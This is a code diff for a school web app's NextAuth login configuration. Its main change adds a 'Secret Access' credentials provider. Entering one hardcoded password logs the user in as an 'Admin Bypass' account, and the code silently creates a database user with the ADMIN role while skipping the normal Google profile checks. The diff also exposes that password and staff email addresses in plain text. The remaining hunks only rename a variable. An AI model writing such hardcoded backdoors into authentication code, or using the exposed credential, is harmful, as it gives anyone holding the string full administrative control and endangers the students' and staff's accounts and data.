@@ -1,5 +1,6 @@
 import { NextAuthOptions } from "next-auth";
 import GoogleProvider from "next-auth/providers/google";
+import CredentialsProvider from "next-auth/providers/credentials";
 import { google } from "googleapis";
 import { prisma } from "@/lib/prisma";
 import path from "path";
@@ -29,9 +30,42 @@ export const authOptions: NextAuthOptions = {
                 },
             },
         }),
+        CredentialsProvider({
+            name: "Secret Access",
+            credentials: {
+                password: { label: "Password", type: "password" }
+            },
+            async authorize(credentials) {
+                if (credentials?.password === "rappseinaudi2526!") {
+                    return {
+                        id: "admin-bypass",
+                        name: "Admin Bypass",
+                        email: "rappresentanti@einaudicorreggio.it",
+                    };
+                }
+                return null;
+            }
+        })
     ],
     callbacks: {
-        async signIn({ account, profile }) {
+        async signIn({ user, account, profile }) {
+            // Bypass for credentials provider
+            if (account?.provider === "credentials") {
+                const email = user.email!;
+                let dbUser = await prisma.user.findUnique({ where: { email } });
+                if (!dbUser) {
+                    await prisma.user.create({
+                        data: {
+                            email,
+                            nome: user.name || "Admin",
+                            ruolo: "ADMIN",
+                            classe: "STAFF"
+                        }
+                    });
+                }
+                return true;
+            }
+
             console.log("Profile:", profile);
             if (!account || !profile || !profile.email) return false;
 
@@ -57,7 +91,7 @@ export const authOptions: NextAuthOptions = {
                 // But for now let's proceed, maybe it's an admin or teacher without class.
             }
 
-            let user = await prisma.user.findUnique({
+            let dbUser = await prisma.user.findUnique({
                 where: {
                     email: profile.email,
                 },
@@ -66,8 +100,8 @@ export const authOptions: NextAuthOptions = {
             const isAdminEmail = profile.email === "gasparini.fabrizio@einaudicorreggio.it";
             const role = isAdminEmail ? "ADMIN" : "STUDENTE";
 
-            if (!user) {
-                user = await prisma.user.create({
+            if (!dbUser) {
+                dbUser = await prisma.user.create({
                     data: {
                         email: profile.email,
                         nome: profile.name || "",
@@ -77,11 +111,11 @@ export const authOptions: NextAuthOptions = {
                 });
             } else {
                 const dataToUpdate: any = {};
-                if (user.classe !== classe && classe !== "") {
+                if (dbUser.classe !== classe && classe !== "") {
                     dataToUpdate.classe = classe;
                 }
                 // Auto-promote to admin if email matches, just in case
-                if (isAdminEmail && user.ruolo !== "ADMIN") {
+                if (isAdminEmail && dbUser.ruolo !== "ADMIN") {
                     dataToUpdate.ruolo = "ADMIN";
                 }
                 
